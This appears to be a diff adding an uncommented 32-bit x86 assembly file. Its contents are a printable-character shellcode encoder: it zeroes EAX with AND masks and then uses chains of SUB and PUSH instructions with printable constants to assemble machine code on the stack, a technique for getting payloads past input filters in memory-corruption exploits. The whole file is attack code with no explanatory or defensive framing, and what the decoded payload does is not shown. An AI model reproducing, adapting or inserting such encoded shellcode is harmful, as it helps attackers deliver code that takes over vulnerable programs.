@@ -1,0 +1,129 @@
+BITS 32
+push esp
+pop  eax
+sub  eax, 0x57605430
+sub  eax, 0x55465330
+sub  eax, 0x53595630
+push eax
+pop  esp
+and  eax, 0x40373d37
+and  eax, 0x30404040
+sub  eax, 0x7a7a7a64
+sub  eax, 0x7a7a7a63
+sub  eax, 0x7a7a7a62
+push eax
+sub  eax, 0x306b6c60
+sub  eax, 0x306a685c
+sub  eax, 0x306a6a5b
+push eax
+sub  eax, 0x496c5842
+sub  eax, 0x3c6c533f
+sub  eax, 0x486c5c41
+push eax
+sub  eax, 0x5762386b
+sub  eax, 0x495a375e
+sub  eax, 0x5365376e
+sub  eax, 0x5b60365b
+push eax
+sub  eax, 0x5e544040
+sub  eax, 0x5c43403f
+sub  eax, 0x5e524740
+sub  eax, 0x63573c3e
+push eax
+sub  eax, 0x6064575f
+sub  eax, 0x4c624855
+sub  eax, 0x61615953
+push eax
+sub  eax, 0x73415857
+sub  eax, 0x713e4b50
+sub  eax, 0x713c5f4f
+push eax
+sub  eax, 0x4c55353c
+sub  eax, 0x4c48353a
+push eax
+sub  eax, 0x7158634e
+sub  eax, 0x6d415547
+sub  eax, 0x7257604d
+sub  eax, 0x68595d53
+push eax
+sub  eax, 0x39755a70
+sub  eax, 0x37755665
+sub  eax, 0x3d756067
+push eax
+sub  eax, 0x30515464
+sub  eax, 0x30444d61
+sub  eax, 0x315a4d60
+push eax
+sub  eax, 0x38667850
+sub  eax, 0x3763774d
+sub  eax, 0x3861774f
+push eax
+sub  eax, 0x69673d5f
+sub  eax, 0x675c3a56
+sub  eax, 0x6a543751
+push eax
+sub  eax, 0x485c5264
+sub  eax, 0x45534a56
+sub  eax, 0x50624d6a
+sub  eax, 0x445f4648
+push eax
+sub  eax, 0x545c7231
+sub  eax, 0x45517031
+sub  eax, 0x51487031
+push eax
+sub  eax, 0x605b306a
+sub  eax, 0x56593064
+sub  eax, 0x66593061
+push eax
+sub  eax, 0x483e4662
+sub  eax, 0x483b445f
+sub  eax, 0x483e4860
+sub  eax, 0x4a3b485f
+push eax
+sub  eax, 0x6b455b6b
+sub  eax, 0x69425a68
+sub  eax, 0x684a5b68
+push eax
+sub  eax, 0x45646364
+sub  eax, 0x3c585962
+sub  eax, 0x47605b62
+sub  eax, 0x4b605562
+push eax
+sub  eax, 0x493c6b6a
+sub  eax, 0x3f3a5f66
+sub  eax, 0x4440706f
+push eax
+sub  eax, 0x65556868
+sub  eax, 0x5f556667
+sub  eax, 0x5a576568
+push eax
+sub  eax, 0x41607244
+sub  eax, 0x41546f40
+sub  eax, 0x424b7240
+push eax
+sub  eax, 0x59434b4a
+sub  eax, 0x5942434a
+push eax
+sub  eax, 0x606a3d48
+sub  eax, 0x5c5a3c48
+sub  eax, 0x615c3d49
+sub  eax, 0x5f533e48
+push eax
+sub  eax, 0x6858446c
+sub  eax, 0x5a4f3f59
+sub  eax, 0x68584569
+sub  eax, 0x565e4459
+push eax
+sub  eax, 0x416f7639
+sub  eax, 0x416e7136
+push eax
+sub  eax, 0x5c5b3f6b
+sub  eax, 0x595c3f5f
+push eax
+sub  eax, 0x693c4077
+sub  eax, 0x5e3c4077
+push eax
+sub  eax, 0x75753e69
+sub  eax, 0x73743d65
+sub  eax, 0x71763d65
+push eax
